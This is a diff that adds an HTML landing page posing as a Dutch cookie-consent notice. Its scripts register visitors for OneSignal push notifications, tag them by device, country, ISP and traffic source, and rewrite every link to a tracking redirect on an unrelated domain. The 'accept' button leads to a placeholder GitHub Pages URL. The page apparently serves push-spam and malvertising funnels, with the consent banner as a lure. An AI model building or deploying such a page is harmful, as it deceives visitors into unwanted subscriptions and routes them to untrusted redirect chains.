@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+
+<html lang="DE"><head>
+
+<script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script>
+<script>
+ window.OneSignal = window.OneSignal || [];
+OneSignal.push(function () {
+    OneSignal.init({
+        appId: "",
+        safari_web_id: "",
+        notifyButton: {
+            enable: true,
+        },
+    });
+    const urlParams = new URLSearchParams(window.location.search);
+    OneSignal.sendTag("device", urlParams.get('device'));
+    OneSignal.sendTag("country", urlParams.get('country'));
+    OneSignal.sendTag("os", urlParams.get('os'));
+    OneSignal.sendTag("isp", urlParams.get('isp'));
+    OneSignal.sendTag("source", urlParams.get('source'));
+    if (isMob()) {
+        OneSignal.sendTag('platform', 'mobile');
+    } else {
+        OneSignal.sendTag('platform', 'desktop');
+    }
+});
+function isMob() {
+    const toMatch = [
+        /Android/i,
+        /webOS/i,
+        /iPhone/i,
+        /iPad/i,
+        /iPod/i,
+        /BlackBerry/i,
+        /Windows Phone/i
+    ];
+    return toMatch.some((toMatchItem) => {
+        return navigator.userAgent.match(toMatchItem);
+    });
+}
+</script>
+
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <title>Cookie tracking</title>
+   
+    <link href="index_files/bootstrap.min.css" rel="stylesheet">
+    <link href="index_files/style.css" rel="stylesheet">
+    <link href="index_files/style-form.css" rel="stylesheet">
+
+    <script>
+  document.addEventListener('DOMContentLoaded', () => {
+    var links = document.getElementsByTagName('a');
+    var getParams = window.location.search.substr(1); // Get url params with removed '?' at the beginning of the string
+    for (var i = 0; i < links.length; i++) {
+      links[i].href = 'http://visit.propertyexchangerspride.com/Byx9LM?' + getParams
+    }
+  });
+</script>
+
+   </head>
+
+<body>
+    
+    <!--  Clickcease.com tracking-->
+    <section id="formModal" class="overflow-auto sign-up-container" style="display: block;">
+        <form action="https://angeloblanco3122.github.io/angelo/clickurlhere">
+
+            <h3>Cookie tracking</h3>
+            <p>Om onze website voor u te optimaliseren en deze continu te kunnen verbeteren, gebruiken wij cookies. Ga akkoord met het gebruik van cookies.</p>
+            <a class="button3" id="formModalButton"><span>→</span>
+ik aanvaard</a>
+            
+        </form>
+    </section>
+    <nav class="navbar navbar-expand-lg">
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+        <a href="https://angeloblanco3122.github.io/angelo/clickurlhere" class=""></a>
+        <div class="collapse navbar-collapse" id="navbarNav">
+        </div>
+    </nav>
+    <div class="container-fluid header-block">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-8">
+                    <br><br>
+                    <br><br>
+                    <br><br>    <br><br>
+                    <br><br>
+                    <br><br>
+                  
+                   
+                   	<br><br>
+                   	<br><br>
+                   	<br><br>
+                   	<br><br>
+                   	<br><br>
+                   	<br>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+   
+
+
+
+
+</body></html>
